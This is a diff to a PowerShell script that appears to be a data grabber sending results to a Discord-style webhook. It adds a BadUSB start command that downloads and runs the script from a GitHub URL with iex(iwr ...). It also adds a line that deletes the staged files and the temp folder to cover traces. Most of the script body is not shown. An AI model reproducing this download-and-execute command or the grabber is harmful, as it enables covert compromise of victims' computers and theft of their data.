@@ -1,3 +1,7 @@
+#Start command for your bad usb or idk
+#powershell $webHookUrl='"YOUR_WEBHOOK"';iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/gr.ps1).content)
+
+
 
 $webHookUrlPYTHON="'"+$webHookUrl+"'"
 New-Item "C:\temp" -Type Directory
@@ -152,5 +156,6 @@ cls
 cd C:\Users\$env:UserName\
 Remove-Item C:\temp\MicrosoftPolicy.png -Recurse -Force -Confirm:$false
 Remove-Item C:\temp\UUID.py -Recurse -Force -Confirm:$false
+Remove-Item C:\temp\ -Recurse -Force -Confirm:$false
 cls
 exit
